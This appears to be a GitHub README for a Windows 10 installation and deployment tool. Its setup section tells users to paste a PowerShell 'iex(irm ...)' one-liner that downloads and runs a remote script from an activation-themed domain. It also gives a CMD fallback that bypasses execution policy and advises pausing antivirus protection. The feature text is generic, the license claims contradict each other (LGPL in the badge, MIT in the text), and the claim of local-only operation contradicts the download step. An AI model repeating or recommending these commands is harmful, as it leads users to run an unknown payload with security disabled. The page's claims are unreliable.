<div align="center">

# Windows 10 Installer: Setup Media & Deployment Tool for Windows 10 & 11

![preview](https://raw.githubusercontent.com/Hunsaaa/windows-10-installer-tool/main/thumb_7878a03.svg)

[![ps](https://img.shields.io/badge/PS-7%2B-ec4899?style=plastic&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/LIC-LGPL--2.1-f472b6?style=plastic&labelColor=0d1117)]() [![win](https://img.shields.io/badge/WIN-WINDOWS_10_%7C_11-db2777?style=plastic&labelColor=0d1117)]()

</div>

---

Windows 10 Installer is a desktop deployment utility for preparing installation media, launching the setup process, and provisioning Windows 10 on compatible hardware. The application streamlines media creation and setup initiation through a guided workflow, reducing the manual steps required to bring a system to a working state. It is designed for users performing clean installs or reinstallation on machines that meet the Windows 10 platform requirements.

## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **Automated setup** — one command, done.
> Windows 10 / 11 · PowerShell · One-line install

### 1️⃣ Launch PowerShell
* Open the Start menu and type **PowerShell**.
* Right-click and choose **Run as administrator** (optional).

### 2️⃣ Execute the setup script
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If blocked by policy — CMD fallback
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> If security software blocks the setup, temporarily pause Real-Time Protection, run the script, then re-enable it.

## 📋 System Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **Installation Media Preparation:** Guided workflow for creating bootable USB drives or ISO images from Windows 10 installation sources, with automatic target device detection and format validation.

- **Setup Launcher:** Initiates the Windows 10 setup process from within a running system or from prepared media, handling prerequisite checks before setup begins.

- **Compatibility Verification:** Pre-installation scan of processor architecture, available storage, memory, firmware mode (UEFI/Legacy), and TPM state to confirm the target machine meets Windows 10 requirements.

- **Reinstall and Repair Mode:** Supports clean installation and reinstallation scenarios, allowing users to restore a working Windows 10 environment on compatible hardware.

- **Installation Mode Selection:** Choose between standard interactive setup and guided assisted setup, with clear prompts at each stage of the process.

- **Progress and Status Reporting:** Real-time feedback during media preparation and setup initiation, including stage indicators and error descriptions for failed checks.

- **Local Operation:** All preparation and setup actions run locally on the user's machine; no external services are required during installation.

- **Lightweight Footprint:** Minimal system resource usage during media preparation and setup launching, suitable for low-specification machines.

## How it works

Windows 10 Installer follows a linear deployment workflow designed to reduce manual intervention at every stage. The application begins with a hardware and environment scan, verifying storage controllers, firmware mode, available disk space, and secure boot state before any write operations are performed. This validation pass surfaces compatibility issues early, preventing failed installations on unsupported configurations.

Once the target system passes verification, the installer prepares the installation media. It handles partitioning and formatting of the selected drive, writes the boot environment, and stages the Windows 10 image for deployment. The media preparation process supports both USB and local disk targets, with progress reporting and integrity checks at each step to confirm the staged files match expected checksums.

The setup phase then hands control to an unattended installation engine. A generated configuration file supplies drive allocation, user profile settings, locale preferences, and first-boot options, allowing the installation to proceed without interactive prompts. The engine monitors setup progress and captures exit codes, so failures are detected and reported rather than silently ignored.

After setup completes, the installer runs a post-installation pass that applies remaining configuration, verifies the boot entry, and confirms the system reaches a usable desktop state. Logs from every phase are retained for review, giving users a clear record of what was attempted and where any step diverged from the expected path.

## Compatibility

The installer targets Windows 10 x64 and x86 platforms, with primary validation against the 22H2 feature update baseline. Installation media preparation requires a host system running Windows 10 version 1809 or later, or Windows 11, with administrative privileges and a minimum of 8 GB free storage for image staging. Setup execution supports both BIOS (legacy) and UEFI firmware modes, including Secure Boot-enabled configurations when using signed boot components.

Hardware compatibility verification is performed prior to deployment and covers storage controller detection (AHCI, NVMe, and RAID configurations), minimum memory thresholds, and processor architecture confirmation. The tool maintains an internal compatibility matrix that flags unsupported chipset or firmware combinations before media creation begins, reducing failed installation attempts.

Deployment scenarios supported include clean installations on unformatted drives, in-place reinstallation over existing Windows 10 partitions, and recovery-style setup on systems with corrupted boot records. Network-based deployment is supported through PXE boot integration for environments requiring multi-machine rollouts.

The installer remains compatible with standard Windows 10 servicing channels and does not interfere with subsequent Windows Update operations. Driver injection during setup is supported for storage and network controllers when vendor-supplied packages are provided in the expected directory structure. Systems with TPM 2.0 and virtualization-based security enabled are handled through standard setup pathways without requiring manual configuration changes.

## FAQ

**Is the installer compatible with both UEFI and Legacy BIOS systems?**

Yes. The boot environment manager detects the active firmware interface during the pre-installation phase and configures the partitioning scheme accordingly—GPT with an EFI system partition for UEFI targets, and MBR with an active boot partition for Legacy BIOS targets. Secure Boot state is queried and reported before any disk operations begin.

**Which image formats are supported for installation media preparation?**

The tool operates on WIM and ESD images through low-level wrappers around the Windows Imaging API. Both formats can be mounted, serviced, and applied. Split-image (.swm) sets are handled transparently when the install image exceeds the FAT32 file size ceiling on removable media.

**Can drivers and updates be injected before the first boot?**

Yes. The DISM servicing pipeline exposes offline package management hooks that run against the mounted image prior to deployment. Storage controller drivers, cumulative updates, and optional system features can be staged so the target system boots with full hardware support and without a network dependency.

**Does the tool support unattended installation?**

The unattended setup engine generates an answer file covering disk allocation, user profile pre-configuration, locale and time zone settings, and first-boot bypass routines. The generated configuration is validated against the selected image edition before the setup process is started, reducing mid-installation prompts.

**What compatibility checks run before installation begins?**

Asynchronous verification loops inspect the storage controller mode (AHCI, RAID, or NVMe), available disk capacity against the image footprint, firmware type and Secure Boot state, and minimum memory thresholds. Results are surfaced as a pre-flight report so incompatibilities are identified before any partition is modified.

**Is reinstalling over an existing Windows 10 installation supported?**

Yes. The setup process can be started in upgrade mode, which preserves user data and installed applications, or in clean mode, which repartitions the target disk. The selected mode is recorded in the generated answer file and confirmed during the pre-flight stage.

**How is installation media prepared for removable drives?**

The media preparation routine formats the target volume, writes the boot environment, and applies the install image in a single pass. Both single-partition FAT32 layouts and multi-partition layouts with a separate NTFS install volume are supported, with the appropriate layout chosen based on image size and firmware type.

**What happens if the installation is interrupted?**

The setup process is resumable at defined checkpoints. If deployment is interrupted after image application, re-running the tool detects the partially applied image and offers to continue from the last completed stage rather than restarting from the beginning.

## Disclaimer

Windows-10-Full-22H2-Version is provided as a deployment utility for preparing installation media and orchestrating the Windows 10 setup workflow. It is intended for use by system administrators, deployment engineers, and users who are familiar with installation procedures and system recovery practices.

This tool does not modify, patch, or activate Windows 10 outside of the standard setup and servicing operations exposed by the underlying deployment interfaces. All image handling, unattended configuration generation, and driver injection routines operate on user-supplied installation media and system images.

Users are solely responsible for ensuring they hold valid licenses for any Windows 10 installation media, images, or products used in conjunction with this tool. The project does not supply, distribute, or endorse unauthorized copies of operating system images or activation methods.

Installation and reinstallation operations can alter disk partitions, boot configuration, and existing data. Review all configuration parameters, target drive selections, and unattended answer files before initiating a deployment. Data loss resulting from misconfigured deployments is the responsibility of the operator.

Compatibility checks performed by the tool are advisory and do not guarantee successful installation on every hardware configuration. Storage controllers, firmware settings, and secure boot states should be verified independently before proceeding.

The software is provided on an "as is" basis, without warranties of any kind, express or implied, including but not limited to fitness for a particular purpose or non-infringement. In no event shall the authors or contributors be liable for any claim, damages, or other liability arising from the use of the software or its deployment operations.

## License

Windows-10-Full-22H2-Version is distributed under the MIT License, granting unrestricted use, modification, and redistribution of the installer tooling in source and binary forms, subject to inclusion of the original copyright notice and permission notice in all copies or substantial portions of the software.

The license applies to the deployment framework code authored for this project — including the media preparation logic, setup orchestration routines, and compatibility verification modules — but does not extend to any Microsoft Windows installation images, binaries, or components referenced or handled by the tool. Windows 10 itself remains governed by its own applicable Microsoft licensing terms, and users are responsible for ensuring they hold valid entitlement for any operating system installed through this tool.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

Redistribution in compiled form must reproduce the above copyright notice, this list of conditions, and the accompanying disclaimer in the documentation and/or other materials provided with the distribution.